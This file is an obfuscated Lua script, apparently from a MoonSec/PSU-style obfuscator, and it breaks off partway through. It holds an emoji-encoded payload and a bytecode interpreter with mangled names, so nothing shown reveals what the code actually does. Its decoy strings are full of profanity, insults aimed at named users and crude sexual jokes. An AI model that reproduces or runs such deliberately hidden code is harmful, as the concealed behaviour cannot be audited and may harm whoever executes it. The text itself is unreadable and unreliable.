🤪😃🙂😂😜🙃🙂🤣😃😃😉😁😆😄😊😅😆😄😇😝🤣😉🤪😅😂😄😜😝🙂🙃😃😅😉😅😁😉😊🙃😆😅😝😃🤣🤪🤪🙃😂🤣😀😃🙃😃😄🤣😉😅😁😃😊😝🤣😁😝😅🤣😄🤪😝😂🙃😀😉🙃😃😄😃😉🙃😁😂😇😃😅😀😝🙃🤣😅😜🤣😂😝😀🤪🙃😅😄😆😉😝😁😊😇😅😅😂😜🤣🤣🙃😜🙃🙂😃😄😁🙃🙃😄🤣😊😃😆😄😇🙃😅🙃🤪🤪🤣😝😜🙃🙂😅😄😂🙃😝😄😉😊😅😆😅😝😉😅🙃🤪😅😂😃😃😂🙂🙃😃🤣😉😃😄😝😊🤪😆😅😝😅😅😝🤪😊😂😅😀😆🙂😝😃🙃😉😉😁😃😇😄😆🙃😝🙂🤣😃🤪😜😂🙃😀😊😉😉😃😝😉😝😁😅😝😇😆😝😝😉🤣😅😜🤣😂😝😀😝😉😄😄😃😉😝😁🙃🤪😀😅😃😝🤪🤣🙃😜😅😇😝😀😝🙃😝😄😅😊😃😁😝😇🙃😅😅🤪😃😊😆😜🙃🙂🙃😃😃🙃🤪😄🙃😊😅😆😃😇😝🤣🙂🤪😅😂😅😜😝🙂😊😃😅😉😃😄😝😊🙃😆😜😝😃😅😝🤪🙃😂🤣😀😃🙂😝😃🙃😉🤣😁😃😊😝😆🙃😝😅🤣😃🤪😝😂🙃😀😇🙃😃😃😝😉🙃😁😅🤪😇😆😝😝🙃🤣😅😜😄😂😝😀🙃🙃😅😄😃😉😝😁🙃😇😅😅😃😝😝🤣🙃😜😅🙂😃😀😝🙃🙃😄😅😊😃😁😝😇🙃😅😅🤪😃🤣😝😜🙃🙂😅😃😃🙃😝😄🙃😊🙂😆😃😇😝😅🙃🤪😅😂😃😜😝🙂🙃😃😅😉😃😄😝😊🙃😆😅😝😃😅😝🤪🙃😂😅😀😃🙂😜😃🙃😉😅😁😃😊😝😆🙃😝😅🤣😃🤪😝😂😉😀😅🙃😃😃😝😉🙃😁😅😇😃😆😝😝🙃🤣😂😜🙃😂😝😀🙃🙃😅😄😁😉😝😁🙃😇😅😅😃😝😝🤣🙃🤣😅😇😃😇😇🙃🙃😄😅😊😃😁😝😀😆😅😅🤪😃🤣😝😜🙃🙂😅😃😃🙂😝🤣🙂😄🙂😆😅😇😝😅🙃🤪😅😝😁😂🤣😜😝😂😉😁😉😁😁😊🙃😆😅😝😃😝😀😅😝🤪😂🤣😉😜😊🙂😀😉🤣😁😆😊😝😆🙃😝😅😝😆🤣😄😝😊😇😆🙃😅😃😝😉🙃😁😅😄😆😊😅😁😉😝😂😁🤪🙂🙃😀🙃🙃😅😄😃😀😃😂😊😃😝😉😁😆🙂😝🤪😁🙃😜😊😂🤪😃😁🙂😉😜😇😅😜😇🙃😅😅🤪😃😂😜😄😝🙂😅😃😆🙃😝😁😃😊😅😆😃😇😝😅🙃😜😝😂😃😀😀🙂🙃😃🙂😉😃😄🤪😊🙃😆😊😝😇😅😝🤪😇😂😅😀🤣🙂😝😃😉😉😅😁😄😊😝😆😝🤪😄🤣😃🤪😝😂🙃😀😉🙃😃😃🤪😉🙃😁🙃😇🤪😆😝😝🙃🤣😅😜🙃😂😝😀😉🙃😅😁😁🤪😃😁🙃😇🙂😅😃🤪😅🤣🙃😜😅🙂😃😀😝😊😃😄😅😊😆😁😝😇😇😅😅🤪😄🤣😝😜🙃🙃😆😃😃😉😀😄🙃😊😂😆😃😇😝😅🙃😜😂😉😊😜😝🙂😇😃😅😉😆😄😝😊🙃😆😅🤪😁😂😃🤪🙃😂🙃😀😃🙂😜😃🙃😉😅😁😃😇😜😆🙃😝😅🤣🤣🤪😝😂😇😀😅🙃😃😃😝😉🙃😁😅😇😃😅😁😝🙃🤣😅😜😃😂😝😀🙃😉😂😄😃😉😝😆😀😇😅😅😆😝😝🤣🙃😜😅🙂😅😀😝🙃🙃😄😉😊😃😅😊😇🙃😅🤣🤪😃🤣😝😃😂🙂😅😃😉🙃😝😄😝😊😅😆😃😇😝🤣😊😜😜😂😃😀😂🙂🙃😃😉😉😃😄😝😊🙃🤣😅😝😃😅😝😜😁😂😅😀😊🙂😝😄😀😉😅😅😃😊😝😆🙃🤪😀🤣😃🤪😝😂🙃😀😊🙃😃😃😝😉🙃😁😅😇🤪😆😝🤪😃🤣😅😜😃😂😝😀🙃🙃😅😄😃😊😊😁🙃😇😝😅😃😝😝🤣🙃😜😅🙂😃😀😝😉😆😄😅😊😜😁😝😇😊😅😅😀😃🤣😝😜🙃🙃😀😃😃😉🙂😄🙃😊🙃😆😃😇😝😅🙃🤪😅😂😇😜😝🙂😊😃😅😉😁😄😝😊🙃😆😅😝😃🤣🙂🤪🙃🙂😀😀😃🙃😀😃🙃😇😅😁😃😊😝😅😆😝😅🤣😇🤪😝😂😉😀😅🙃😃😃😝😉🙃😁😜😇😃😆😜😝🙃🤣😂😜😃😂😝😀🙃🙃😅😄😅😉😝😆😄😇😅😅😊😝😝🤣🙃😜😅🙂😃😃🤣🙃🙃😄🙂😊😃😁😜😇🙃😂😅🤪😃🤣😝😜😇🙂😅😃😉🙃😝😄😉😊😅😆😅😜😄😅🙃🤪😉😂😃😀😊🙂🙃😃🤣😉😃😁😜🤪😝😆😅😝🤣😅😝😜😃😂😅😀😃🙂😝😃🙃😝😃😁😃😇😄😆🙃😝🤣🤣😃😜😃😂🙃😀😅😉😀😃😝😉😝😁😅😇😁😆😝😝🙃🤣😅😜😃🙂😂😀🙃🙃😅😄😃😉🤪😁🙃😇😅😅😃😝😝🤣🙃😜😅🙂😃😃😀🙃🙃");local _l__=(-#'This file has been enchanted with uncrackable V, fuck the fuck off'+(0x1a7-241))local _l=59 local __=__l;local _={}_={[(114-0x71)]=function()local _,_ll,__l,_lll=___lll(_ll_ll,__,__+_ll__);__=__+_l_l_;_l=(_l+(_l__*_l_l_))%_l_;return(((_lll+_l-(_l__)+___*(_l_l_*____))%___)*((____*__l_ll)^____))+(((__l+_l-(_l__*____)+___*(____^_ll__))%_l_)*(___*_l_))+(((_ll+_l-(_l__*_ll__)+__l_ll)%_l_)*___)+((_+_l-(_l__*_l_l_)+__l_ll)%_l_);end,[((6144/0x80)+-#"This script has been obfuscated using your mom")]=function(_,_,_)local _=___lll(_ll_ll,__,__);__=__+__ll;_l=(_l+(_l__))%_l_;return((_+_l-(_l__)+__l_ll)%___);end,[(-#[[<@!761654159095103499> shut the fuck up]]+(206-((0xce+-35)+-#"midruto")))]=function()local _ll,_=___lll(_ll_ll,__,__+____);_l=(_l+(_l__*____))%_l_;__=__+____;return(((_+_l-(_l__)+___*(____*_l_l_))%___)*_l_)+((_ll+_l-(_l__*____)+_l_*(____^_ll__))%___);end,[(864/0xd8)]=function(_l,_,__)if __ then local _=(_l/____^(_-__l))%____^((__-__ll)-(_-__l)+__ll);return _-_%__l;else local _=____^(_-__ll);return(_l%(_+_)>=_)and __l or _____;end;end,[(-0x30+53)]=function()local _l=_[(0x43-66)]();local _ll=_[(117+-0x74)]();local _lll=__l;local __=(_[(-0x1d+33)](_ll,__ll,_l_lll+_l_l_)*(____^(_l_lll*____)))+_l;local _l=_[(828/0xcf)](_ll,21,31);local _=((-__l)^_[(106-0x66)](_ll,32));if(_l==_____)then if(__==_lllll)then return _*_____;else _l=__ll;_lll=_lllll;end;elseif(_l==(___*(____^_ll__))-__ll)then return(__==_____)and(_*(__ll/_lllll))or(_*(_____/_lllll));end;return _ll__l(_,_l-((_l_*(_l_l_))-__l))*(_lll+(__/(____^__l__l)));end,[((-#"Moonsec v6 coming out in 1 day"+(211926/0xd1))/164)]=function(_ll,_lll,_lll)local _lll;if(not _ll)then _ll=_[(-0x2f+48)]();if(_ll==_____)then return'';end;end;_lll=_l_l_l(_ll_ll,__,__+_ll-__l);__=__+_ll;local _=''for __=__ll,#_lll do _=___l_l(_,____ll((___lll(_l_l_l(_lll,__,__))+_l)%_l_))_l=(_l+_l__)%___ end return _;end}local function __l_ll(...)return{...},_lll_l('#',...)end local function _ll_ll()local _l_l={};local _ll_={};local _l={};local _l__={_l_l,_ll_,nil,_l};local __={}local _llll=(-#"Federal likes femboys"+(0x94c/85))local _ll={[(86-0x52)]=(function(_l)return not(#_l==_[(107-0x69)]())end),[(99-0x61)]=(function(_l)return _[(-26+0x1f)]()end),[((0x50-55)+-#'Unrepeats your until nil')]=(function(_l)return _[((0x1699/(0xc9+-112))+-#[[when the drip is respectable but the script is undetectable]])]()end),[((-58+0x7b)+-#"this file has been secured with a wall the size of your mother")]=(function(_l)local _ll=_[((0xae-(0x162-224))+-#"GIVE ME MY FUCKING ROLE BACK YOU BITCH")]()local _=''local _l=1 for __=1,#_ll do _l=(_l+_llll)%_l_ _=___l_l(_,____ll((___lll(_ll:sub(__,__))+_l)%___))end return _ end)};local _l=_[(39-0x26)]()for _l=1,_l do local _=_[(476/0xee)]();local __l;local _=_ll[_%(-#"Jeff Bezos approved"+(0x5e-56))];__[_l]=_ and _({});end;for _l_=1,_[(((335-0xcf)+-#"MoonSec V7 coming out soon")-101)]()do local _l=_[(0x2c-42)]();if(_[(0x52-((0x19b-263)+-#"I am albanian obfuscator I cannot hide this script please dont view it"))](_l,__l,__ll)==_lllll)then local _ll_=_[(-0x20+36)](_l,____,_ll__);local _ll=_[(0x49-69)](_l,_l_l_,____+_l_l_);local _l={_[(-123+0x7e)](),_[((0x1b9c/228)+-#"dOeS iT sUppOrT gEtFeNv tHo?")](),nil,nil};local ___={[((144-0x61)+-#[[KFC tried to justify urls as fake constants LOL]])]=function()_l[_l__l]=_[(0x35+-50)]();_l[__llll]=_[(51-0x30)]();end,[(0x35/(2756/0x34))]=function()_l[_lll]=_[(106+-0x69)]();end,[(0x73+-113)]=function()_l[___l]=_[(98/0x62)]()-(____^_l_lll)end,[(30-0x1b)]=function()_l[___ll]=_[((-0x54+126)+-#"oh oh i will hack you =opens dev console=")]()-(____^_l_lll)_l[_lll_]=_[(501/0xa7)]();end};___[_ll_]();if(_[(-0x7e+130)](_ll,__ll,__l)==__ll)then _l[__l_]=__[_l[__l_]]end if(_[(0x14c/83)](_ll,____,____)==__l)then _l[_ll_l]=__[_l[_lll]]end if(_[(75+-0x47)](_ll,_ll__,_ll__)==__ll)then _l[_l___]=__[_l[__ll_]]end _l_l[_l_]=_l;end end;for _=__ll,_[((-0x6c+164)+-#'can someone send me the psu source code it got deletedd')]()do _ll_[_-__ll]=_ll_ll();end;_l__[3]=_[(0x7a/61)]();return _l__;end;local function _____(_,_l_l_,_l__)local _l_=_[____];local __=_[_ll__];local _=_[__l];return(function(...)local _l=__l;local ___lll=_lll_l('#',...)-__ll;local _lllll={};local ___=__;local _ll__=_l_;local _l_=_;local _=__l_ll local __={};local _=__l _*=-1 local _=_;local _l_lll={...};local _ll_ll={};for _=0,___lll do if(_>=___)then _ll_ll[_-___]=_l_lll[_+__ll];else __[_]=_l_lll[_+__l];end;end;local _=___lll-___+__l local _;local ___;while true do _=_l_[_l];___=_[(182/(280+-0x62))];_ll=(3995652)while(0xc3-155)>=___ do _ll-= _ll _ll=(4082980)while ___<=(-#[[OFFICER SHE WAS 18 IN DOG YEARS nice booba btw]]+((-#[[This file has been enchanted with uncrackable V, fuck the fuck off]]+(83+-0x41))+113))do _ll-= _ll _ll=(680379)while ___<=(131-0x7a)do _ll-= _ll _ll=(6463938)while ___<=(0x2d+-41)do _ll-= _ll _ll=(1000545)while ___<=((7395/0xff)+-#[[Yeah this is getting cringe-]])do _ll-= _ll _ll=(1229751)while(0x0/173)<___ do _ll-= _ll _l__[_[_l_ll]]=__[_[_ll_]];break end while(_ll)/((-#'This code was obfuscated using PSU, which stands for Penis Sucking Utilities'+(125829/0x5d)))==963 do local _ll=_[__lll];local _l=__[_[_lll]];__[_ll+1]=_l;__[_ll]=_l[_[__ll_]];break end;break;end while 3665==(_ll)/((0xc549/185))do _ll=(6004017)while ___<=(160/0x50)do _ll-= _ll __[_[__l_l]][_[_ll_l]]=__[_[_l___]];break;end while 3769==(_ll)/((-#[[The Great Sage Equal To Heaven is here Luraph users hide!!!!]]+((376964-0x2e06a)/114)))do _ll=(1313886)while((-#"mer trolled u"+(0x1ae0/215))+-16)<___ do _ll-= _ll _l__[_[_ll_l]]=__[_[__lll]];break end while(_ll)/((-30+0x37b))==1526 do __[_[__l_l]][__[_[___l]]]=_[__llll];break end;break;end break;end break;end while 2054==(_ll)/((-#'<@847154787934011462> stupid ass'+(-0x45+3248)))do _ll=(2230480)while(0x24/(-#"Slowmode is enabled."+(166-0x8c)))>=___ do _ll-= _ll _ll=(6631954)while ___>(92-0x57)do _ll-= _ll local _ll;__[_[_l_l]]={};_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[_ll_l]))_l=_l+__l;_=_l_[_l];__[_[_ll_]][_[_ll_l]]=__[_[___l_]];_l=_l+__l;_=_l_[_l];__[_[__lll]][_[_l_ll]]=__[_[_l___]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_ll_l]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_l__l];break end while(_ll)/((0x3fbd0/72))==1829 do __[_[_llll]]=__[_[_l__l]]-__[_[__l__]];break end;break;end while 2276==(_ll)/((0xf500/64))do _ll=(3948846)while ___<=(0x38-(115-0x42))do _ll-= _ll __[_[__l_]]=_[_ll_l];break;end while 3102==(_ll)/((-#[[True]]+((-#[[oh wait thats an invalid character]]+(5367-0xa9e))-1338)))do _ll=(884961)while ___>(-0x77+127)do _ll-= _ll local _ll=_[_l_l];local _l=__[_[___l]];__[_ll+1]=_l;__[_ll]=_l[_[_lll_]];break end while(_ll)/((539-(31108/0x65)))==3831 do __[_[_l_l]]={};break end;break;end break;end break;end break;end while(_ll)/((-0x18+3783))==181 do _ll=(4838294)while ___<=(-#[[<@!519139355118534656> stop with the cap ms v3 got my script 30.0 ms]]+(0x4010/200))do _ll-= _ll _ll=(2576866)while((-#'imagine if roblox didnt use lua'+(-76+0x3e))+56)>=___ do _ll-= _ll _ll=(2588698)while(0x67c/166)<___ do _ll-= _ll if not __[_[__l_]]then _l=_l+__ll;else _l=_[___l];end;break end while(_ll)/((-#"Wally loooooooves federal"+(0x13f0-2573)))==1033 do do return end;break end;break;end while 1042==(_ll)/((-0x71+2586))do _ll=(233874)while ___<=((29376/0xd8)+-#'Okay guys federal can notice you just stab a fork into your ass, write .gg/moonsec on your feet, and DONT send it to federal')do _ll-= _ll do return end;break;end while(_ll)/((0x3b18/124))==1917 do _ll=(4398240)while(0x49-60)<___ do _ll-= _ll __[_[_ll_]]=__[_[_l__l]][_[_lll_]];break end while 3808==(_ll)/(((1276+-0x66)+-#[[what wally is using]]))do _l=_[___ll];break end;break;end break;end break;end while(_ll)/(((0x965+-112)+-#'Jahman for owner again! = 2021'))==2138 do _ll=(1232682)while((0x95e/109)+-#'hacker')>=___ do _ll-= _ll _ll=(2181021)while ___>(0x6d+-94)do _ll-= _ll __[_[__lll]]=__[_[_l_ll]][_[_l___]];break end while(_ll)/((0xd74-(187090/0x6a)))==1299 do do return __[_[__l_]]end break end;break;end while 418==(_ll)/(((0x73545/159)+-#"Telecrypter buggin bro"))do _ll=(116446)while ___<=(0x671/97)do _ll-= _ll local _ll=_[_ll_];local __l=__[_ll]local _l_=__[_ll+2];if(_l_>0)then if(__l>__[_ll+1])then _l=_[_lll];else __[_ll+3]=__l;end elseif(__l<__[_ll+1])then _l=_[_l_ll];else __[_ll+3]=__l;end break;end while(_ll)/((383-0xf9))==869 do _ll=(7107966)while(2484/0x8a)<___ do _ll-= _ll local _ll;__[_[__l_]]=_[_lll];_l=_l+__l;_=_l_[_l];_ll=_[__l_]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[__lll]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[__l_]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_l__l];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_llll]][__[_[_lll]]]=__[_[_lll_]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];if __[_[__l_]]then _l=_l+__l;else _l=_[___l];end;break end while 2714==(_ll)/((570942/0xda))do local _ll=_[_ll_];local __l=__[_ll]local _l_=__[_ll+2];if(_l_>0)then if(__l>__[_ll+1])then _l=_[___l];else __[_ll+3]=__l;end elseif(__l<__[_ll+1])then _l=_[_lll];else __[_ll+3]=__l;end break end;break;end break;end break;end break;end break;end while(_ll)/((0xb3364/249))==1385 do _ll=(9920138)while ___<=(667/0x17)do _ll-= _ll _ll=(15582619)while ___<=((-119+0xb7)+-#"no she is 7000 y.o with huuuuuge milkers")do _ll-= _ll _ll=(2443770)while(127-0x6a)>=___ do _ll-= _ll _ll=(1816212)while ___>(-#'this message was written on the 4th of August, 2021 at 4:50 PM GMT'+(266-0xb4))do _ll-= _ll if not __[_[_ll_]]then _l=_l+__ll;else _l=_[___l];end;break end while 986==(_ll)/((-0x7d+1967))do local __ll;local ___;local _ll;__[_[_l_l]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=#__[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[_lll];_l=_l+__l;_=_l_[_l];_ll=_[_ll_];___=__[_ll]__ll=__[_ll+2];if(__ll>0)then if(___>__[_ll+1])then _l=_[_l__l];else __[_ll+3]=___;end elseif(___<__[_ll+1])then _l=_[___ll];else __[_ll+3]=___;end break end;break;end while 630==(_ll)/(((0x1ed3-3959)+-#"This file was obfuscated with luraph obfuscator v13.2"))do _ll=(307285)while(0xe18/164)>=___ do _ll-= _ll __[_[_llll]]=_l__[_[_lll]];break;end while(_ll)/((393-0xd0))==1661 do _ll=(728035)while ___>(0xf8b/173)do _ll-= _ll __[_[_llll]]=__[_[_ll_l]][__[_[__ll_]]];break end while(_ll)/((0x313-402))==1891 do local _ll=_[_llll];local _l_=__[_ll+2];local __l=__[_ll]+_l_;__[_ll]=__l;if(_l_>0)then if(__l<=__[_ll+1])then _l=_[_l_ll];__[_ll+3]=__l;end elseif(__l>=__[_ll+1])then _l=_[_l__l];__[_ll+3]=__l;end break end;break;end break;end break;end while(_ll)/((0xf02+-33))==4091 do _ll=(2832720)while ___<=(168-0x8e)do _ll-= _ll _ll=(5309428)while(92-(-#'Federal was here...'+(209-0x7b)))<___ do _ll-= _ll local _l_ll;local ___;local __lll;local _ll;__[_[_ll_]]=_l__[_[_ll_l]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=__[_[_lll]][_[__llll]];_l=_l+__l;_=_l_[_l];_ll=_[__l_l];__lll=__[_[_ll_l]];__[_ll+1]=__lll;__[_ll]=__lll[_[_lll_]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=__[_[_lll]];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];_ll=_[_l_l];__lll=__[_[_l__l]];__[_ll+1]=__lll;__[_ll]=__lll[_[_lll_]];_l=_l+__l;_=_l_[_l];_ll=_[__l_l]__[_ll]=__[_ll](__[_ll+__ll])_l=_l+__l;_=_l_[_l];___={__,_};___[__ll][___[____][_llll]]=___[__l][___[____][__ll_]]+___[__ll][___[____][_lll]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=__[_[_ll_l]]%_[__l__];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](__[_ll+__ll])_l=_l+__l;_=_l_[_l];__lll=_[_lll];_l_ll=__[__lll]for _=__lll+1,_[__ll_]do _l_ll=_l_ll..__[_];end;__[_[_l_l]]=_l_ll;_l=_l+__l;_=_l_[_l];___={__,_};___[__ll][___[____][_ll_]]=___[__l][___[____][__l__]]+___[__ll][___[____][_ll_l]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=__[_[___ll]]%_[___l_];break end while 3884==(_ll)/((0x56e+-23))do if(__[_[_l_l]]~=__[_[__ll_]])then _l=_l+__ll;else _l=_[___ll];end;break end;break;end while(_ll)/((0x28c20/94))==1595 do _ll=(8470160)while ___<=(-#'moon 3.1'+(4305/0x7b))do _ll-= _ll __[_[_l_l]]=_l_l_[_[_ll_l]];break;end while(_ll)/((267680/0x70))==3544 do _ll=(8435202)while ___>(5656/0xca)do _ll-= _ll __[_[__l_]]=_l_l_[_[_l__l]];break end while(_ll)/((-#'penis'+(0xea7+-107)))==2318 do local _ll;_l__[_[_l_ll]]=__[_[_l_l]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]={};_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][__[_[___ll]]]=_[__l__];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[__l_]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_ll_]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[_llll]]={};_l=_l+__l;_=_l_[_l];__[_[_ll_]]={};_l=_l+__l;_=_l_[_l];__[_[__l_]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[_ll_l];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[__lll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_ll_l];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_lll];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_lll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][__[_[_ll_l]]]=__[_[__llll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[_l__l]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[_l__l];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_l_ll];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[_ll_]][__[_[_l__l]]]=__[_[__l__]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[__l_]]=_[_lll];_l=_l+__l;_=_l_[_l];_ll=_[__l_]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l__l]))_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[___ll]];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___ll];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_l_ll];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_lll];_l=_l+__l;_=_l_[_l];_ll=_[__l_]__[_ll]=__[_ll](____l(__,_ll+__l,_[___l]))_l=_l+__l;_=_l_[_l];__[_[__l_l]][__[_[___ll]]]=__[_[__l__]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[_l__l];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[_ll_l];_l=_l+__l;_=_l_[_l];_ll=_[__lll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l__l]))_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_l__l];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](__[_ll+__ll])_l=_l+__l;_=_l_[_l];__[_[_ll_]][__[_[_ll_l]]]=__[_[__llll]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_l__[_[_l_ll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_ll_l];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[_ll_l];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_ll_]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l__l]))_l=_l+__l;_=_l_[_l];__[_[_ll_]]={};_l=_l+__l;_=_l_[_l];__[_[_llll]]={};_l=_l+__l;_=_l_[_l];__[_[__l_]]=_l__[_[___l]];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[_l_l]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[___ll]))_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[_l__l]];_l=_l+__l;_=_l_[_l];__[_[_llll]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[_l__l];_l=_l+__l;_=_l_[_l];__[_[__lll]]=_[___ll];_l=_l+__l;_=_l_[_l];_ll=_[_llll]__[_ll]=__[_ll](____l(__,_ll+__l,_[_l_ll]))_l=_l+__l;_=_l_[_l];__[_[__lll]][__[_[_l_ll]]]=__[_[__llll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_l__[_[_lll]];_l=_l+__l;_=_l_[_l];__[_[__l_l]]=_[_lll];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[___l];_l=_l+__l;_=_l_[_l];__[_[_ll_]]=_[___l];_l=_l+__l;_=_l_[_l];_ll=_[_l_l]__[_ll]=__[_ll](____l(__,_ll+__l,_[_ll_l]))break end;break;end break;end break;end break;end while(_ll)/((-#'Bye bye :wave:'+(4098+-0x1e)))==2447 do _ll=(13197780)while((91+(-0x439/23))+-#"nice dump!")>=___ do _ll-= _ll _ll=(33840)while ___<=(0x81-98)do _ll-= _ll _ll=(3446226)while(0x90+-114)<___ do _ll-= _ll if(__[_[_ll_]]~=__[_[_l___]])then _l=_l+__ll;else _l=_[_l__l];end;break end while(_ll)/((-#'disagree'+(3513-(400488/0xde))))==2026 do __[_[_llll]]=__[_[___ll]];break end;break;end while(_ll)/((558-0x143))==144 do _ll=(5324514)while ___<=(((31350-0x3d72)/0xdc)+-#[[i know what sex is, but i wont tell you]])do _ll-= _ll local _l=_[__lll];local _ll=__[_l];for _=_l+1,_[___ll]do _l__ll(_ll,__[_])end;break;end while 3471==(_ll)/((3138-0x644))do _ll=(1312596)while(4026/0x7a)<___ do _ll-= _ll __[_[_llll]]=(_[_ll_l]~=0);_l=_l+__ll;break end while 1919==(_ll)/((-#'This file has been enchanted with uncrackable V, fuck the fuck off'+((3105-0x630)-771)))do __[_[__l_]]=_____(_ll__[_[_l__l]],nil,_l__);break end;break;end break;end break;end while 3420==(_ll)/(((7840-0xf6c)+-#[[this file was obfuscated manually]]))do _ll=(3124812)while((11305/0x85)+-#'hey psst you the wrapper function is right there')>=___ do _ll-= _ll _ll=(1525923)while(840/0x18)>=___ do _ll-= _ll __[_[__l_]]={};break;end while(_ll)/((111965/0xf5))==3339 do _ll=(9214998)while ___>((5160/0x78)+-#[[bitcoin]])do _ll-= _ll local _ll=_[_l_l];local _l_=__[_ll+2];local __l=__[_ll]+_l_;__[_ll]=__l;if(_l_>0)then if(__l<=__[_ll+1])then _l=_[___ll];__[_ll+3]=__l;end elseif(__l>=__[_ll+1])then _l=_[_l__l];__[_ll+3]=__l;end break end while 3811==(_ll)/((4893-0x9ab))do __[_[_l_l]][__[_[_l_ll]]]=__[_[__llll]];break end;break;end break;end while(_ll)/((-68+0x560))==2389 do _ll=(5566813)while(-#"I love moonsec (give me free moonsex premium now 